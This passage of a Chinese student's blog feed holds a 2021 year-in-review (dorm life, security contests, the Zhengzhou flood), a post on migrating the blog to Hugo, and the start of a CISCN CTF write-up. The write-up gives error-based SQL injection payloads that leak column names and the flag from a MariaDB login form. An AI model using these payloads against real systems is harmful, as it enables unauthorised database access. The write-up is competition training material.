&lt;p&gt;宿舍某次出门聚餐吃了烤羊腿，这个腿啊，真的是一言难尽，我们宿舍6个人带个蹭饭的同学7个人，这个羊腿的套餐没份都不够，比如只有4-5个，让我们分的很不舒服，并且这个腿吃着完全没有味道！好多地方嚼不动。已经被我标记了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031122638.png"
loading="lazy"
alt="202202031122638"
&gt;&lt;/p&gt;
&lt;p&gt;今年更得番《奇蛋物语》感觉太棒了，剧情讲的很完美，每个女生都有自己的伤口，也都有自己战斗的理由。很多角色身上的弱点性格，在自己身边和自己身上都有见过，只是当时的自己也没有深入思考过如何面对，看这部番也给了一个自己思考的机会。总之就是看完以后然我也觉得充满了力量。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032200970.png"
loading="lazy"
alt="202202032200970"
&gt;&lt;/p&gt;
&lt;p&gt;我姐在她楼下的蛋糕店办了个卡，办卡送了一个蛋糕但是我姐一个人吃不完，刚好我和爸妈一起去我姐那，就把蛋糕领回家吃了。🐭🐭我啊，最喜欢吃甜甜的蛋糕了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032212239.png"
loading="lazy"
alt="202202032212239"
&gt;&lt;/p&gt;
&lt;p&gt;我姐特别想养小狗，让我舅帮忙找了一只崽回家，看这睡得狗仰马翻，还有一张闻着我臭jio睡的就不发了。再多的就不说了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032214338.png"
loading="lazy"
alt="202202032214338"
&gt;&lt;/p&gt;
&lt;p&gt;在宿舍基本上就是一星期总要喝一桶可乐，后来觉得不养生室友就一起买那种临期奶，又便宜又能换换口味，当时我们宿舍和室友的女朋友的宿舍，一起合买了17箱奶，后来还是一两个星期都干差不多了。冰山一角↓&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032218031.png"
loading="lazy"
alt="202202032218031"
&gt;&lt;/p&gt;
&lt;p&gt;对面宿舍买了个包子玩具，说是解压玩儿的，这我不好说了。我和一个室友看上了，也在网上买了两个&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032253000.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我找到了一张照片，是我早上爬起来发现嘴边有点痒，用照相机一拍，原来是蚊子在我嘴上叮了一口，我淦&lt;/p&gt;
&lt;p&gt;2021年4月18日，Steam上的《绣湖:旅馆》白给了，可惜已经买了被小刺。&lt;/p&gt;
&lt;p&gt;给我爸换了新手机红米K40。&lt;/p&gt;
&lt;p&gt;我姐NS到了，让我盯着游戏打折买游戏，当时买了健身环、动森。后来打折还买了塞尔达、分手厨房、奥德赛。&lt;/p&gt;
&lt;p&gt;大概5月份成了预备党员。&lt;/p&gt;
&lt;p&gt;指环王重映了，这估计是我姐在高中那会看的，想再看一遍但又找不到人，就叫上我一起，我顺便蹭我姐饭/大笑。那阵子指环王是一周上一一部，一共三部曲看了三个星期。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032253383.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h1 id="6月"&gt;6月
&lt;/h1&gt;&lt;p&gt;在宿舍楼里看到外面风景很棒，就随手拍了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032259268.png"
loading="lazy"
alt="image-20220203225926080"
&gt;&lt;/p&gt;
&lt;p&gt;还有一天，外面狂风大作，感觉吹得风打的雷劈的闪电都能把楼给拆了，但是那天却可以在宿舍里暖暖和和的打游戏，头一次在宿舍感觉到了家的感觉😂（过了几天还有一件大事，只我知道，标下日期2021.6.4）&lt;/p&gt;
&lt;p&gt;在我姐那，刚好举着手机拍外面，发现了一个自由的气球上天了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203232532148.png"
loading="lazy"
alt="image-20220203232532148"
&gt;&lt;/p&gt;
&lt;p&gt;在我姐那玩的健身环，这游戏雀食好啊，雀食好&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203232629974.png"
loading="lazy"
alt="image-20220203232629974"
&gt;&lt;/p&gt;
&lt;p&gt;人生第一次出去打比赛去河大打的，大佬说比赛是非常非常非常非常非常非常水的比赛，我们组只拿了三等奖，不过算是体验一把了，下面这个颁奖仪式还有个视频被传网上很火，B站视频找不到了，贴个&lt;a class="link" href="https://baijiahao.baidu.com/s?id=1703496081195246883" target="_blank" rel="noopener"
&gt;相关的新闻&lt;/a&gt;里面有视频。主要还是体验一把学校报销费用打比赛。&lt;/p&gt;
&lt;p&gt;今天在学校还学成了点外卖，一个星期就要去吃一次汉堡，主要还是学校食堂太小，一进里面就根本想不出哪家的饭还能吃下，越想越想直接扭头回宿舍。为此我还在闲鱼上买了个饿了吗年卡，30块，有点膈应的就是会找你要验证码，在卖家哪登陆，这么便宜主要还是把淘宝上的88会员给拆开卖了，我还买过一年的网易云黑胶40多。&lt;/p&gt;
&lt;p&gt;这是半个榴莲，我同学的表弟给他送过去吃，他带回宿舍室友都不吃，臭味多少有点冲，吃不完就给我了，我和我一个室友知道这榴莲可是大补，两个人一会儿怼了一半😋&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203235536483.png"
loading="lazy"
alt="image-20220203235536483"
&gt;&lt;/p&gt;
&lt;p&gt;下半年打的全国大学生信息安全竞赛，本来我觉得自己刚加集训队菜的离谱，大佬们还是带着我组了四人队，先是线上赛打了两天，集训队的两个队伍进分赛区了，接下来去的武汉华科大打的，看了看人家学校真的是慕的直流口水，人家这学校才叫大学。分赛区的举办方在有点远的地方包了酒店，原价380一晚的房间选手只用100多还是200多我忘了，反正那个酒店是我目前住过最豪华的（反正自己也没住过多少酒店就是了），大大的落地窗还有小冰柜，冰柜里面还有可乐雪碧，太爽咯！早上自助餐也挺丰盛。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041228579.png"
loading="lazy"
alt="image-20220204122812777"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218645.png"
loading="lazy"
alt="image-20220204121250689"
&gt;&lt;/p&gt;
&lt;p&gt;选手就位&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218688.png"
loading="lazy"
alt="image-20220204121427306"
&gt;&lt;/p&gt;
&lt;p&gt;最后成绩是打了分赛区的第二名一等奖，有了总决赛资格，分赛区第一名是三巨头实在打不过。打完比赛回学校集训队老师还发了新闻到学校官网，人生第一次上学校官网新闻。&lt;/p&gt;
&lt;p&gt;同学空间整活，直呼太艺术了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218511.png"
loading="lazy"
alt="image-20220204121816989"
&gt;&lt;/p&gt;
&lt;h1 id="7月"&gt;7月
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;最奇妙的一个月&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在家里屋顶上拍的好风景&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041220290.png"
loading="lazy"
alt="image-20220204122042961"
&gt;&lt;/p&gt;
&lt;p&gt;接下来就是去哈工大打总决赛，是第二次坐飞机，第一次坐飞机是和我姐去贝加尔湖。专门挑的挨窗户的位置，但是这个窗户有划痕拍的不好看&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041224785.png"
loading="lazy"
alt="image-20220204122455470"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041225871.png"
loading="lazy"
alt="image-20220204122518187"
&gt;&lt;/p&gt;
&lt;p&gt;飞机餐没啥看的就不放了，还有一张拍了很小很小很小的月亮&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041226179.png"
loading="lazy"
alt="image-20220204122638400"
&gt;&lt;/p&gt;
&lt;p&gt;哈尔滨站&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041227088.png"
loading="lazy"
alt="image-20220204122724866"
&gt;&lt;/p&gt;
&lt;p&gt;刚到的第一个酒店进去就一股霉味，然后整个房间都是那种很阴森的感觉，我们四个人都觉的不太舒服就换了个。&lt;/p&gt;
&lt;p&gt;第一次去哈工大&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062252119.png"
loading="lazy"
alt="image-20220206225235384"
&gt;&lt;/p&gt;
&lt;p&gt;晚上也不知道怎么吃饭，就几个人一起出去吃了铁锅炖大鹅，听了好久了终于吃上一次正宗的。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062254173.png"
loading="lazy"
alt="image-20220206225359559"
&gt;&lt;/p&gt;
&lt;p&gt;然后就是比赛的内容了。&lt;/p&gt;
&lt;p&gt;总结这次比赛就是我们被爆锤，对比赛的重点没有把握好，第一天CTF算是比较正常的题，就是每个队伍的题是抽的，有的队伍抽的简单题就小不公平，然后就是加了一个叫可信计算的题目，大伙基本上都是第一次听说，比赛让我负责的这块我摸索了半天也没啥头绪，不过其他队伍也没解出多少。（最后比赛完听有的队伍说，有一道题的git仓库没有删掉，可以利用分支回溯原来的代码，太艹了）&lt;/p&gt;
&lt;p&gt;第二天是被吊起来打的一天，我们队经验最多的总共也就参加过2-3次AWD比赛，这次比赛还禁用了靶机一些指令导致防御方面失算了，不过主要原因也怪我，因为我是主要负责这个方面的，分赛区的时候用&lt;a class="link" href="https://github.com/leohearts/awd-watchbird" target="_blank" rel="noopener"
&gt;WatchBird&lt;/a&gt;太舒服了，导致这次比赛大意了还是想一招吃遍天，这次比赛注重的就是防御，因为靶机一轮如果被攻击就会直接扣100分，但是攻击一次其他队伍才2分，总共也就80多个队伍，算上防御完美的想要稳分数只有不被打。然后我们比赛还出现了最逆天的一幕，因为靶机宕机会扣分，比赛有一个队伍没人来按理说应该是最后一名，但是我们队因为一直被打，然后修的慌慌张张导致好几轮靶机宕机，我们是倒一！&lt;/p&gt;
&lt;p&gt;这次总决赛属实是拉胯了，不过也真心地明白了自己是有多菜，之前分赛区的成绩很彩但也不好说。第一天打完老师就把我们叫到宾馆好好说了一顿，老师说他们也不容易向学校申请我们这次来的经费，然后拿个三等奖才刚好能把费用持平blablabla，还好总决赛不算太激烈，80个队伍79个都能拿到奖，最后我们也是拿了个三等奖末尾回家了。&lt;/p&gt;
&lt;p&gt;比赛还有最吸引人的地方就是华为之夜，因为华为是举办方所以晚上有顿大餐，所以我们打进总决赛还有个目标就是华为之夜。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062243341.png"
loading="lazy"
alt="image-20220206224345289"
&gt;&lt;/p&gt;
&lt;p&gt;入场的时候会发一张奖券，然后主持人就在上面组织一场小游戏抽一波奖，大伙都在下面坐的急不可耐，一等奖是华为mate40 pro、二等奖是华为手表，剩下的都是些手环、摄像头、音响啥的不值钱。我们队伍最后是四个人三个三等奖，我拿了个手环，最最最最劲爆的消息就是：我们其中一位带队老师，中了一等奖！当时我们看到我们老师上台的时候人都傻了（因为老师去和其他学校搞关系了没和我们坐一起），更羡慕的是我们这位老师这次比赛其实带着自己老婆来哈尔滨玩一玩，然后美滋滋的抱着mate40 pro回家了，我们老师中了奖，我们也觉得不虚此行。赛后我们四个人就去打卡哈尔滨了。&lt;/p&gt;
&lt;p&gt;去了中央大街&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062250240.png"
loading="lazy"
alt="image-20220206225006859"
&gt;&lt;/p&gt;
&lt;p&gt;一直走到头江上的小酒吧，当时还驻场歌手在船上唱歌，我们就坐着听了好久吹了吹江边的风&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062251122.png"
loading="lazy"
alt="image-20220206225138098"
&gt;&lt;/p&gt;
&lt;p&gt;然后就是回家的时候，我们和老师没有订同一班的飞机但是时间都差不多，我们订了第二天7月19号中午11点的飞机但是延误了，就赶快找下一班的飞机是晚上18点，那天晚上在候机厅等了好久，一起玩原神，也就是这次带了一个队友开始入坑原神。我华为之夜中的一个手环还落到酒店了，当时老师的飞机停机已经安排了住宿，就托老师帮我回酒店拿了下，结果我们的飞机也不停的延误延误，最后等到0点乘客在前台和服务员理论，安排了辆车把我们送到酒店（和老师是同一个的，第二天我就去找老师拿东西了）。&lt;/p&gt;
&lt;h1 id="720特大暴雨"&gt;7·20特大暴雨
&lt;/h1&gt;&lt;p&gt;飞机通知第二天7月20号八点起飞，那天黑龙江天气特好也算是准时起飞了，就是落地跟上了郑州7·20特大暴雨的全程。&lt;/p&gt;
&lt;p&gt;我们当时落郑州的时候，就在郑州上面的云层里震了好一会，大概也有半个小时都是在很厚的云层里飞，什么都看不见，要是没飞机导航估计都不知道去哪了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071034613.png"
loading="lazy"
alt="image-20220207103402513"
&gt;&lt;/p&gt;
&lt;p&gt;我们落地那会算是赶上了好天气，仿佛就是让我们这一班飞机从天上下来一样，外面太阳露了一点雨下的很小。然后我们就坐着城郊线回市区，路上就感觉外面的天气不对劲，当时我记得4点都外面的天气就黑的离大谱，感觉像晚上7点左右的天气&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071037670.png"
loading="lazy"
alt="image-20220207103733659"
&gt;&lt;/p&gt;
&lt;p&gt;我们最后都转了二号线，但是我姐住处在五号线上和二号线隔了一站需要换乘，我原来不打算换乘，直接走一站过去，但是当我出门的时候人都傻了，看远处公交一半轮胎已经都没了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071044725.png"
loading="lazy"
alt="image-20220207104401937"
&gt;&lt;/p&gt;
&lt;p&gt;原来还有想淌水过去的想法，但是想着背着电脑就算了。又回去换乘了五号线坐到下一站，后来看了五号线被淹的视频就感到小害怕。下一站出站口就没有被淹这么厉害，但是我看周围也没有什么能存贮水的道牙什么的，纯流动的水都已经淹过我鞋底了。我跑了两家超市才买了东西会楼上，第一家因为断网了没办法收银。最最最难的一道坎就是房子在25+楼！！！&lt;/p&gt;
&lt;p&gt;然后就是在那没水没电的三天两夜，每天只上下楼一次保存体力，外出的时候去超市买水买面包，我妈还在小区的群里给我买了个应急的充电宝续命，我用自己电脑反向充电，发现了个平板还有50多的点，玩了玩连连看保持理智。在满屋子跑着找信号给爸妈报状态，无聊的时候拿着吃的和小板凳坐到楼顶看下面十字路口堵车😶‍🌫️&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071053172.png"
loading="lazy"
alt="image-20220207105346100"
&gt;&lt;/p&gt;
&lt;p&gt;最气的是啥，我在的这个小区没有电，但是隔壁的小区灯火辉煌，但凡有个电我都能打着单机无限续命。&lt;/p&gt;
&lt;p&gt;离开前的当天，我打算去我姐单位找补给，路上看到了真的是经历天灾后的城市，有一点点电影上的那种感觉了。路边都是隧道捞出来的车，到处都是泥泞，我走了好久才找到了一辆能用的共享单车，那几天好像全部的共享单车都免费骑助力郑州恢复，但是网不好使。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071059181.png"
loading="lazy"
alt="image-20220207105927277"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071059747.png"
loading="lazy"
alt="image-20220207105946114"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071100154.png"
loading="lazy"
alt="image-20220207110011595"
&gt;&lt;/p&gt;
&lt;p&gt;天上的直升机&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202071100636.png"
loading="lazy"
alt="image-20220207110033843"
&gt;&lt;/p&gt;
&lt;p&gt;逝者安息。&lt;/p&gt;
&lt;h1 id="后半年"&gt;后半年
&lt;/h1&gt;&lt;p&gt;基本上都是准备考研，等有时间再更。&lt;/p&gt;</description></item><item><title>博客搬迁</title><link>https://www.braindance.top/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</link><pubDate>Mon, 31 Jan 2022 11:31:54 +0800</pubDate><guid>https://www.braindance.top/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</guid><description>&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202201311142110.jpg"
loading="lazy"
alt="202201311142110"
&gt;&lt;/p&gt;
&lt;p&gt;大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。&lt;/p&gt;
&lt;h1 id="为什么选择hugo"&gt;为什么选择Hugo
&lt;/h1&gt;&lt;p&gt;因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多&lt;strong&gt;依赖&lt;/strong&gt;，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。&lt;/p&gt;
&lt;p&gt;hugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以感觉要是长期写东西的话，&lt;strong&gt;选个好的框架也是个长远的选择&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;hugo在github上的⭐也比hexo多。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://github-readme-stats.vercel.app/api/pin/?username=gohugoio&amp;amp;repo=hugo"
loading="lazy"
alt="Readme Card"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://github-readme-stats.vercel.app/api/pin/?username=hexojs&amp;amp;repo=hexo"
loading="lazy"
alt="Readme Card"
&gt;&lt;/p&gt;
&lt;p&gt;不过在迁移的过程中，最大的感受就是：&lt;strong&gt;Hugo在国内的使用者不多&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了&lt;a class="link" href="https://github.com/luizdepra/hugo-coder" target="_blank" rel="noopener"
&gt;coder&lt;/a&gt;这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是&lt;a class="link" href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener"
&gt;DoIt&lt;/a&gt;，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。&lt;/p&gt;
&lt;h1 id="博客的部署"&gt;博客的部署
&lt;/h1&gt;&lt;p&gt;之前使用hexo，在最后使用的时候发现了&lt;a class="link" href="https://www.travis-ci.com/" target="_blank" rel="noopener"
&gt;Travis CI - Test and Deploy with Confidence&lt;/a&gt; &lt;strong&gt;持续集成&lt;/strong&gt;这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。&lt;/p&gt;
&lt;p&gt;所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客&lt;a class="link" href="https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html" target="_blank" rel="noopener"
&gt;GitHub Actions 入门教程&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。&lt;/p&gt;
&lt;p&gt;所以最后的部署的流程就是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本地push到github仓库 &amp;ndash;&amp;gt; 仓库Actions发布到github pages、服务器拉取page仓库。&lt;/p&gt;&lt;/blockquote&gt;</description></item><item><title>CISCN线上赛库存</title><link>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description>&lt;h1 id="easy_sql"&gt;easy_sql
&lt;/h1&gt;&lt;p&gt;在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是&lt;strong&gt;括号单引号闭合&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;过滤的字符有union，所以尝试报错注入，查询版本号。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来想要通过&lt;strong&gt;information_schema&lt;/strong&gt;库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p&gt;
&lt;p&gt;最后参考了网上的一篇文章：&lt;a class="link" href="https://blog.csdn.net/weixin_35867608/article/details/113937118" target="_blank" rel="noopener"
&gt;mysql 注入 information_schema_绕过IDS过滤information_schema继续注入&lt;/a&gt;，模仿文章构造payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p&gt;
&lt;h1 id="easy_source"&gt;easy_source
&lt;/h1&gt;&lt;p&gt;使用目录扫描，扫描到了&lt;code&gt;.index.php.swo&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;User&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; $c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;a&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;b&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;c&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;d&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;e&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
